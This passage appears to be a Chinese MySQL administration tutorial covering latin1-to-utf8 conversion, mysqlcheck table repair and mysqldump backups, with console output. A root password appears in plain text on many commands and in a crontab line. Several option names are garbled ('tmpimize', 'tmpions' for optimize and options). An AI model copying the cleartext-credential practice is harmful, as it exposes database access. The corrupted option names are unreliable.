book1;+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                                                                |+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) CHARACTER SET utf8 DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) CHARACTER SET utf8 DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=latin1 |+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><p><strong>&#x6DF1;&#x5165;&#x7814;&#x7A76;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;</strong></p><pre><code class="sql">mysql&gt; drop table book1;Query OK, 0 rows affected (0.00 sec)mysql&gt; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set latin1;Query OK, 0 rows affected (0.01 sec)mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);ERROR 1366 (HY000): Incorrect string value: &apos;\xE3\x80\x8ALin...&apos; for column &apos;bName&apos; at row 1mysql&gt; drop table book1;Query OK, 0 rows affected (0.00 sec)mysql&gt;  CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));Query OK, 0 rows affected (0.00 sec)mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);ERROR 1366 (HY000): Incorrect string value: &apos;\xE3\x80\x8ALin...&apos; for column &apos;bName&apos; at row 1mysql&gt; show create table book1;+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                          |+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=latin1 |+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; drop table book1;                                                        Query OK, 0 rows affected (0.01 sec)mysql&gt;  CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set utf8;Query OK, 0 rows affected (0.01 sec)mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from book1;+---------+-------------------------------+-------+-----------------------+| bTypeId | bName                         | price | publishing            |+---------+-------------------------------+-------+-----------------------+|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;         |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |+---------+-------------------------------+-------+-----------------------+1 row in set (0.00 sec)mysql&gt; show tables;+-----------------------+| Tables_in_testbookdb2 |+-----------------------+| book1                 |+-----------------------+1 row in set (0.00 sec)mysql&gt; CREATE TABLE book2 (bTypeId int,bName char(16),price int,publishing char(16)) character set utf8 COLLATE utf8_general_ci;Query OK, 0 rows affected (0.01 sec)mysql&gt; INSERT INTO book2(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; show create table book2;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                        |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book2 | CREATE TABLE `book2` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; show create table book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                                                                  |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) CHARACTER SET latin1 DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) CHARACTER SET latin1 DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.01 sec)mysql&gt; </code></pre><p><strong>1&#xFF09;&#xFF1A;&#x5BFC;&#x51FA;&#x8868;&#x7ED3;&#x6784;</strong></p><pre><code>    mysqldump -uroot -pJaking@vip.163.com --default-character-set=latin1 -d  testbookdb &gt; booktable.sql </code></pre><p><strong>2&#xFF09;: &#x7F16;&#x8F91;booktable.sql &#x5C06;latin1&#x4FEE;&#x6539;&#x6210;utf8</strong></p><pre><code>    vim booktable.sql &#x4FEE;&#x6539;&#x6240;&#x6709;latin1&#x4E3A;utf8</code></pre><p><strong>3&#xFF09;: &#x786E;&#x4FDD;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x518D;&#x66F4;&#x65B0;&#xFF0C;&#x5BFC;&#x51FA;&#x6307;&#x5B9A;&#x5E93;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;</strong></p><pre><code class="shell"> mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 --databases  testbookdb &gt; bookdata.sql mysqldump -uroot -pJaking@vip.163.com --databases  testbookdb &gt; bookdata.sql          mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -B  testbookdb &gt; bookdata.sql mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -t testbookdb &gt; bookdata.sql mysqldump -uroot -pJaking@vip.163.com --databases  testbookdb &gt; bookdata.sql mysqldump -uroot -pJaking@vip.163.com -t testbookdb &gt; bookdata.sql mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1  -A  &gt; ALL.sql mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert  -A  &gt; ALL.sql mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=utf8  --all-databases  &gt; ALL.sql mysqldump -uroot -pJaking@vip.163.com --all-databases  &gt; ALL.sql mysql -uroot -pJaking@vip.163.com &lt; ALL.sql</code></pre><p><strong>&#x53C2;&#x6570;&#x8BF4;&#x660E;&#xFF1A;</strong><br><code>--quick</code>:&#x7528;&#x4E8E;&#x8F6C;&#x50A8;&#x5927;&#x7684;&#x8868;&#xFF0C;&#x5F3A;&#x5236;mysqldump&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x6B21;&#x4E00;&#x884C;&#x7684;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x800C;&#x4E0D;&#x662F;&#x68C0;&#x7D22;&#x6240;&#x6709;&#x884C;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x5F53;&#x524D;cache&#x5230;&#x5185;&#x5B58;&#x4E2D;<br><code>--no-create-info</code>:&#x4E0D;&#x8981;&#x521B;&#x5EFA;create table&#x8BED;&#x53E5;<br><code>--extended-insert</code>:&#x4F7F;&#x7528;&#x5305;&#x62EC;&#x51E0;&#x4E2A;values&#x5217;&#x8868;&#x7684;&#x591A;&#x884C;insert&#x8BED;&#x6CD5;&#xFF0C;&#x8FD9;&#x6837;&#x6587;&#x4EF6;&#x66F4;&#x5C0F;&#xFF0C;IO&#x4E5F;&#x5C0F;&#xFF0C;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x65F6;&#x4F1A;&#x975E;&#x5E38;&#x5FEB;<br><code>--default-character-set=latin1</code>:&#x6309;&#x7167;&#x539F;&#x6709;&#x5B57;&#x7B26;&#x96C6;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x6837;&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x4E2D;&#x6587;&#x90FD;&#x662F;&#x53EF;&#x89C1;&#x7684;&#xFF0C;&#x4E0D;&#x4F1A;&#x4FDD;&#x5B58;&#x6210;&#x4E71;&#x7801;<br><strong>4&#xFF09;&#xFF1A;&#x6253;&#x5F00;bookdata.sql &#x5C06;SET NAME latin1 &#x4FEE;&#x6539;&#x6210;SET NAME utf8</strong></p><pre><code>             vim bookdata.sql              /*!40101 SET NAMES utf8 */;</code></pre><p><strong>5&#xFF09;: &#x91CD;&#x65B0;&#x5EFA;&#x5E93;</strong></p><pre><code class="SQL">mysql&gt; create database  testdb default charset utf8;</code></pre><p><strong>6&#xFF09;&#xFF1A;&#x5EFA;&#x7ACB;&#x8868;&#xFF0C;&#x5BFC;&#x5165;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5BFC;&#x51FA;&#x7684;&#x8868;&#x7684;&#x8868;&#x7ED3;&#x6784;</strong></p><pre><code class="Shell">mysql -uroot -pJaking@vip.163.com testdb &lt; booktable.sql</code></pre><p><strong>7&#xFF09;: &#x5BFC;&#x5165;&#x6570;&#x636E;</strong></p><pre><code>    mysql -uroot -pJaking@vip.163.com testdb &lt; bookdata.sql    &#x6CE8;&#x610F;&#xFF1A;&#x9009;&#x62E9;&#x76EE;&#x6807;&#x5B57;&#x7B26;&#x96C6;&#x65F6;&#xFF0C;&#x8981;&#x6CE8;&#x610F;&#x6700;&#x597D;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x539F;&#x5B57;&#x7B26;&#x96C6;&#xFF08;&#x5B57;&#x5E93;&#x66F4;&#x5927;&#xFF09;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x4E22;&#x5931;&#x4E0D;&#x88AB;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;</code></pre><p><strong>&#x4E8C;&#xFF1A;MySQL&#x65E5;&#x5E38;&#x7EF4;&#x62A4;</strong></p><p><strong>1&#xFF1A;mysqlcheck mysql&#x4FEE;&#x590D;&#x5DE5;&#x5177;</strong></p><p>mysqlcheck&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x590D;MyISAM&#x8868;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F18;&#x5316;&#x548C;&#x5206;&#x6790;&#x8868;&#x3002;<br>&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5B83;&#x96C6;&#x6210;&#x4E86;mysql&#x5DE5;&#x5177;&#x4E2D;check&#x3001;repair&#x3001;analyze&#x3001;tmpimize&#x7684;&#x529F;&#x80FD;&#x3002;<br>/usr/local/mysql/bin/mysqlcheck   #&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;&#x4F4D;&#x7F6E;</p><pre><code class="Shell">rpm -qf `which mysqlcheck`  yum&#x5B89;&#x88C5;&#x67E5;&#x770B;[root@jaking ~]# rpm -qf `which mysqlcheck`file /usr/local/mysql57/bin/mysqlcheck is not owned by any package[root@jaking ~]# yum provides mysqlcheckLoaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.1:mariadb-5.5.52-1.el7.x86_64 : A community developed branch of MySQLRepo        : rhel7Matched from:Filename    : /usr/bin/mysqlcheck[root@jaking ~]# yum install -y mariadb-5.5.52-1.el7.x86_64[root@jaking ~]# rpm -qf `which mysqlcheck`mariadb-5.5.52-1.el7.x86_64[root@jaking ~]# which mysqlcheck/usr/bin/mysqlcheck</code></pre><p>&#x53C2;&#x6570;&#x9009;&#x9879;&#xFF1A;<br>mysqlcheck &#x2013;help &#x67E5;&#x770B;&#x5E2E;&#x52A9;<br><code>-c</code>, &#x2013;check (&#x68C0;&#x67E5;&#x8868;)&#xFF1B;<br><code>-r</code>, &#x2013;repair&#xFF08;&#x4FEE;&#x590D;&#x8868;)&#xFF1B;<br><code>-a</code>, &#x2013;analyze (&#x5206;&#x6790;&#x8868;)&#xFF1B;<br><code>-o</code>, &#x2013;tmpimize(&#x4F18;&#x5316;&#x8868;)&#xFF1B; //&#x5176;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x9009;&#x9879;&#x662F;-c(&#x68C0;&#x67E5;&#x8868;)<br><code>-u</code>&#xFF0C; &#x4F7F;&#x7528;mysql&#x4E2D;&#x54EA;&#x4E2A;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;</p><p>mysqlcheck&#x4F7F;&#x7528;&#x8BED;&#x6CD5;&#xFF1A;<br>&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;3&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x8C03;&#x7528;mysqlcheck&#xFF1A;<br>mysqlcheck[tmpions] db_name [tables]<br>mysqlcheck[tmpions] &#x2014;database DB1 [DB2 DB3&#x2026;]<br>mysqlcheck[tmpions] &#x2013;all&#x2013;databases<br>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x4EFB;&#x4F55;&#x8868;&#x6216;&#x4F7F;&#x7528;&#x2014;databases(-B)&#x6216;&#x2013;all&#x2013;databases(-A)&#x9009;&#x9879;&#xFF0C;&#x5219;&#x68C0;&#x67E5;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x3002;</p><p>&#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF1A;</p><p>1&#xFF1A;&#x68C0;&#x67E5;&#x8868;(check)</p><pre><code class="shell">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -c testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1                                       OK</code></pre><p>2:  &#x4FEE;&#x590D;&#x8868;&#xFF08;repair&#xFF09;</p><pre><code class="shell">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1note     : The storage engine for the table doesn&apos;t support repair[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 12Server version: 5.7.19 Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show create table testdb.book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                        |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; alter table testdb.book1 engine = MyISAM;Query OK, 0 rows affected (0.00 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; show create table testdb.book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                        |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; exitBye</code></pre><pre><code class="shell">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1                                       OK3:&#x4FEE;&#x590D;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5E93;[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1                                       OK                                 [root@jaking ~]# mysqlcheck -uroot -p  -r --databases testdbEnter password: testdb.book1                                       OKtestdb.book2note     : The storage engine for the table doesn&apos;t support repair</code></pre><p>&#x6269;&#x5C55;&#xFF1A; &#x4FEE;&#x590D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x5BB9;&#x6613;&#x6389;&#x5931;&#x6570;&#x636E;</p><pre><code>fsck -y -f /dev/sdbx</code></pre><p>4:  &#x68C0;&#x67E5;&#x4FEE;&#x590D;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;</p><pre><code class="shell">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -A -rbook.book1                                         OKbook2.book1note     : The storage engine for the table doesn&apos;t support repairmarket.ordernote     : The storage engine for the table doesn&apos;t support repairmarket.order1note     : The storage engine for the table doesn&apos;t support repairmarket.usernote     : The storage engine for the table doesn&apos;t support repairmysql.columns_priv                                 OKmysql.db                                           OKmysql.engine_costnote     : The storage engine for the table doesn&apos;t support repairmysql.event                                        OKmysql.func                                         OKmysql.gtid_executedWarning  : Please do not modify the gtid_executed table. This is a mysql internal system table to store GTIDs for committed transactions. Modifying it can lead to an inconsistent GTID state.note     : The storage engine for the table doesn&apos;t support repairmysql.help_categorynote     : The storage engine for the table doesn&apos;t support repairmysql.help_keywordnote     : The storage engine for the table doesn&apos;t support repairmysql.help_relationnote     : The storage engine for the table doesn&apos;t support repairmysql.help_topicnote     : The storage engine for the table doesn&apos;t support repairmysql.innodb_index_statsnote     : The storage engine for the table doesn&apos;t support repairmysql.innodb_table_statsnote     : The storage engine for the table doesn&apos;t support repairmysql.ndb_binlog_index                             OKmysql.pluginnote     : The storage engine for the table doesn&apos;t support repairmysql.proc                                         OKmysql.procs_priv                                   OKmysql.proxies_priv                                 OKmysql.server_cost</code></pre><p>&#x53C2;&#x6570;-A &#x7B49;&#x4E8E;  &#x2013;all-databases  </p><p>5&#xFF1A;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x4F18;&#x5316;</p><p>&#x4F7F;&#x7528;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;</p><pre><code class="shell">crontab -e#0 1 * * * /usr/bin/mysqlcheck -A -o -r  -u&#x4F60;&#x7684;&#x7528;&#x6237;&#x540D; -p&#x4F60;&#x7684;&#x5BC6;&#x7801; &gt; /dev/null 2&gt;&amp;10 3 * * *  /usr/bin/mysqlcheck -uroot -pJaking@vip.163.com -r -o -A &gt; /dev/null 2&gt;&amp;1 #&#x6BCF;&#x5929;3&#x70B9;&#x4F18;&#x5316;</code></pre><p>2&#xFF1A;MySQL&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;</p><p>1)MySQL&#x5907;&#x4EFD;&#x7684;&#x7C7B;&#x578B;<br>&#x6309;&#x7167;&#x5907;&#x4EFD;&#x65F6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5206;&#x4E3A;&#xFF1A;<br>Hot backup(&#x70ED;&#x5907;)  Cold Backup&#xFF08;&#x51B7;&#x5907;&#xFF09;Warm Backup&#xFF08;&#x6E29;&#x5907;&#xFF09;<br>Hot backup&#xFF1A;&#x70ED;&#x5907;&#x6307;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x4E2D;&#x76F4;&#x63A5;&#x5907;&#x4EFD;&#xFF0C;&#x5BF9;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5F71;&#x54CD;&#xFF0C;&#xFF08;Online Backup&#xFF09;&#x5B98;&#x65B9;&#x624B;&#x518C;&#x4E3A;&#x5728;&#x7EBF;&#x5907;&#x4EFD;<br>Cold Backup&#xFF1A;&#x51B7;&#x5907;&#x6307;&#x5728;&#x6570;&#x636E;&#x5E93;&#x505C;&#x6B62;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#xFF0C;(OfflineBackup) &#x5B98;&#x65B9;&#x624B;&#x518C;&#x79F0;&#x4E3A;&#x79BB;&#x7EBF;&#x5907;&#x4EFD;<br>Warm Backup&#xFF1A;&#x6E29;&#x5907;&#x6307;&#x5907;&#x4EFD;&#x540C;&#x6837;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x65F6;&#x8FDB;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x5BF9;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x6709;&#x6240;&#x5F71;&#x54CD;&#xFF0C;&#x4F8B;&#x5982;&#x52A0;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x8BFB;&#x9501;&#x4EE5;&#x4FDD;&#x8BC1;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;</p><p>&#x6309;&#x7167;&#x5907;&#x4EFD;&#x540E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1A;</p><p>&#x903B;&#x8F91;&#x5907;&#x4EFD; &#x2013;&gt;<br>&#x6307;&#x5907;&#x4EFD;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x662F;&#x53EF;&#x8BFB;&#x7684;&#xFF0C;&#x901A;&#x5E38;&#x4E3A;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x5185;&#x5BB9;&#x4E00;&#x822C;&#x662F;SQL&#x8BED;&#x53E5;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x8868;&#x5185;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x636E;&#xFF0C;&#x5982;mysqldump&#x548C;SELECT * INTO OUTFILE&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x822C;&#x9002;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5347;&#x7EA7;&#x548C;&#x8FC1;&#x79FB;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x8F83;&#x957F;</p><p>&#x88F8;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x2013;&gt;<br>&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7269;&#x7406;&#x6587;&#x4EF6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x65E2;&#x53EF;&#x4EE5;&#x5904;&#x4E8E;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#xFF08;mysqlhotcopy &#x3001;ibbackup&#x3001;xtrabackup&#x8FD9;&#x7C7B;&#x5DE5;&#x5177;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5904;&#x4E8E;&#x505C;&#x6B62;&#x72B6;&#x6001;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x8F83;&#x77ED;&#x3002;</p><p>&#x6309;&#x7167;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5185;&#x5BB9;&#x6765;&#x5206;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#xFF1A;<br>&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#xFF1A;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x5B8C;&#x6574;&#x7684;&#x5907;&#x4EFD;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF1A;&#x5728;&#x4E0A;&#x4E00;&#x6B21;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x5BF9;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#xFF08;xtrabackup&#xFF09;<br>&#x65E5;&#x5FD7;&#x5907;&#x4EFD;&#xFF1A;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x5907;&#x4EFD;&#xFF0C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;</p><p>2)&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x5DE5;&#x5177;mysqldump<br>&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;MySQL&#x5F53;&#x8981;&#x5BFC;&#x5165;&#x6216;&#x8005;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x5E93;&#x7684;&#x65F6;&#x5019;,&#x7528;PHPMYADMIN&#x751A;&#x81F3;MySQL Administrator&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x90FD;&#x4F1A;&#x529B;&#x4E0D;&#x4ECE;&#x5FC3;,&#x8FD9;&#x65F6;&#x53EA;&#x80FD;&#x4F7F;&#x7528;MySQL&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;mysqldump&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x6062;&#x590D;&#xFF1B;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x652F;&#x6301;MyISAM,InnoDB</p><p>MySQL&#x6570;&#x636E;&#x7684;&#x5BFC;&#x51FA;&#x548C;&#x5BFC;&#x5165;&#x5DE5;&#x5177;: mysqldump</p><p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF1A;<br>&#x8BED;&#x6CD5;&#xFF1A; mysqldump [TMPIONS] database [tables] &gt;&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x540D;.sql</p><p>A:&#x5BFC;&#x51FA;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;</p><pre><code class="shell">mysqldump -uroot -pJaking@vip.163.com -A &gt;all.sqlmysqldump -uroot -pJaking@vip.163.com --all-databases &gt;all2.sql</code></pre><p>&#x53C2;&#x6570;-A&#x4EE3;&#x8868;&#x6240;&#x6709;&#xFF0C;&#x7B49;&#x540C;&#x4E8E; &#x2013;all-databases</p><p>B:&#x5BFC;&#x51FA;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;</p><pre><code class="shell">mysqldump -u &#x7528;&#x6237;&#x540D; -p&#x5BC6;&#x7801; &#x6570;&#x636E;&#x5E93;&#x540D; &gt; &#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x540D;.sql  mysqldump -uroot -pJaking@vip.163.com testdb &gt; testdb.sql</code></pre><p>C:&#x5BFC;&#x51FA;&#x5355;&#x5F20;&#x8868;</p><pre><code class="shell">mysqldump -uroot -pJaking@vip.163.com testdb book1 &gt; testdb.book1.sql  #&#x5BFC;&#x51FA;testdb&#x5E93;book1&#x8868;</code></pre><p>D:&#x5BFC;&#x51FA;&#x5E93;&#x7684;&#x8868;&#x7ED3;&#x6784;</p><pre><code class="shell">mysqldump -uroot -pJaking@vip.163.com -d testdb &gt; testdbtable.sql  #&#x53EA;&#x5BFC;&#x51FA;testdb&#x5E93;&#x7684;&#x8868;&#x7ED3;&#x6784;</code></pre><p>E:&#x53EA;&#x5BFC;&#x51FA;&#x6570;&#x636E;</p><pre><code class="shell">mysqldump -uroot -pJaking@vip.163.com -t testdb &gt; testdbdata.sql  #&#x53EA;&#x5BFC;&#x51FA;testdb&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;</code></pre><p>F:&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x5E93;&#x7684;&#x521B;&#x5EFA;&#x8BED;&#x53E5;</p><pre><code class="shell">mysqldump -uroot -pJaking@vip.163.com -B testdb &gt; testdb.sql  #&#x751F;&#x6210;&#x5EFA;&#x5E93;&#x8BED;&#x53E5;mysql -uroot -pJaking@vip.163.com &lt; testdb.sql  